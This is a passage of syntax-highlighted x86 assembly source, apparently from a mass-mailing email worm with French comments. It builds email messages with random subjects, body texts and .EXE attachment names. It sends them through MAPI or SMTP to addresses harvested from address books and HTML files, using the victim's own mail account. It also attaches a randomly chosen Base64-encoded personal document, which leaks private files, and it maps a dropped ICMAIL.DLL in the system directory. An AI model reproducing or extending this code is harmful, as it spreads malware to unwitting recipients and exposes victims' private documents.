    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; User mail not found -&gt; fix another name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mailfrom</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

</span><span class="sc5">BuildHeader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MemMessageBody1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; some mem</span><span class="sc0">

</span><span class="sc5">BuildFrom</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc12">'From: '</span><span class="sc0">                    </span><span class="sc1">; From: </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">lstrcat</span><span class="sc0">                          

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mailfrom</span><span class="sc0">             </span><span class="sc1">; user mail or another fixed</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

</span><span class="sc5">BuildTo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'To: '</span><span class="sc0">                  </span><span class="sc1">; To:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentEmail</span><span class="sc0">         </span><span class="sc1">; Email found in *.wab or Html</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">
    
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">
    
</span><span class="sc5">BuildSubject</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'Subject: '</span><span class="sc0">                 </span><span class="sc1">; Subject:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">NbSubject</span><span class="sc0">                   </span><span class="sc1">; nb Subject</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetRndNumber</span><span class="sc0">                </span><span class="sc1">; edx = rnd nb</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RndSubjectTb</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; table de dd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; Point the right Subject offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; Rnd Subject</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">
    
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

</span><span class="sc5">BuildBody</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MessageBody1</span><span class="sc0">         </span><span class="sc1">; Mime bordel jusqu'a -&gt; email message</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

</span><span class="sc5">BuiltEmailMessage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">NbRndText</span><span class="sc0">                   </span><span class="sc1">; nb Text</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetRndNumber</span><span class="sc0">                </span><span class="sc1">; edx = rnd nb</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RndTextTb</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; table de dd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; Point the right Text offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; Rnd Text</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

</span><span class="sc5">BuildBody1b</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MessageBody1b</span><span class="sc0">            </span><span class="sc1">; email message -&gt; name=</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">PayloadFlag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">BuildFileNamePay</span><span class="sc0">

</span><span class="sc5">BuildFileNameNormal</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">NbRndFileName</span><span class="sc0">               </span><span class="sc1">; nb FileName</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">GetRndNumber</span><span class="sc0">                </span><span class="sc1">; edx = rnd nb</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RndFileNameTb</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; table de dd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; Point the right Text offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; Rnd File in name=</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MessageBody1c</span><span class="sc0">            </span><span class="sc1">; .EXE",CRLF -&gt; filename=</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; Rnd File in filename=</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">BuildSizeBody1</span><span class="sc0">

</span><span class="sc5">BuildFileNamePay</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">Clear_TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">GetFileTitleA</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MessageBody1c</span><span class="sc0">            </span><span class="sc1">; .EXE",CRLF -&gt; filename=</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">

</span><span class="sc5">BuildSizeBody1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0"> 
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrlen</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MessageSize1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Header+Mime bordel lenght for send cmd</span><span class="sc0">

</span><span class="sc5">BuildMessageHeaderError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; for the loop</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.............. Payload Init The Attachement File</span><span class="sc0">

</span><span class="sc5">PayloadSendInit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; For The send Loop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbPersonalFound</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Rnd Range</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">GetRndNumber</span><span class="sc0">                        </span><span class="sc1">; Rnd Nb in edx</span><span class="sc0">

</span><span class="sc5">PayMapiSendInit</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">                
      </span><span class="sc6">rep</span><span class="sc0">       </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PersoDocListe</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; esi = perso doc path</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">                    </span><span class="sc1">; Perso path size</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">PaySmtpSendInit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">CodeB64File</span><span class="sc0">                 </span><span class="sc1">; return perso file encoded in mem</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; For The send Loop </span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">               

</span><span class="sc1">;.............. Some Mem For The Mime Header</span><span class="sc0">

</span><span class="sc5">ReleasePayMem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemEncoded</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">MemFreeIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemToEncode</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">MemFreeIt</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ClearHeaderMem</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MimeHeaderSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MemMessageBody1</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0">       </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.............. Some Mem For The Mime Header</span><span class="sc0">

</span><span class="sc5">ResMemHeader</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">                      </span><span class="sc1">; read/write page</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">MimeHeaderSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; System decide where </span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">VirtualAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MemMessageBody1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
   
</span><span class="sc1">;.............. Map The Email File</span><span class="sc0">

</span><span class="sc1">;OUT:           eax = mapaddress</span><span class="sc0">
</span><span class="sc1">;           cf  = 0 if no error</span><span class="sc0">

</span><span class="sc5">MapEmailFile</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">Clear_TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0"> 
        
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc12">'\ICMAIL.DLL'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">lstrcat</span><span class="sc0">                             </span><span class="sc1">; Path+Name                  </span><span class="sc0">
   
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;.......................... Send Via MAPI ....................................</span><span class="sc0">
</span><span class="sc1">;.............................................................................</span><span class="sc0">


</span><span class="sc5">MapiSend</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; For The send Loop</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MapiMessage</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MAPISession</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">MAPISendMail</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; For The send Loop</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;........................... Send via SMTP ...................................</span><span class="sc0">
</span><span class="sc1">;.............................................................................</span><span class="sc0">

</span><span class="sc1">; 4 Part: </span><span class="sc0">
</span><span class="sc1">;               - GetLocalSmtpServeur: Find default SMTP server</span><span class="sc0">
</span><span class="sc1">;               - SmtpConnection:      Init Socket + Connect to Smpt host</span><span class="sc0">
</span><span class="sc1">;               - SmtpSendCommand:     Send all the commands</span><span class="sc0">
</span><span class="sc1">;               - SmtpDisConnection:   Clean + Disconnect</span><span class="sc0">


</span><span class="sc1">;.............. Get User Server</span><span class="sc0">

</span><span class="sc5">GetUserSmtpServer</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">GetUserInternetAccount</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">KeySize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">       </span><span class="sc1">; Init Size to get</span><span class="sc0">
         
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KeySize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AccountSubKey</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0">     </span><span class="sc3">"Default Mail Account"</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0">     </span><span class="sc3">"Software\Microsoft\Internet Account Manager"</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">SHGetValueA</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc5">GetUserSmtpServerError</span><span class="sc0">

</span><span class="sc5">GetUserInternetServer</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">KeySize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">       </span><span class="sc1">; Init Size to get</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KeySize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SmtpServeur</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0">     </span><span class="sc3">"SMTP Server"</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AccountKey</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">SHGetValueA</span><span class="sc0">
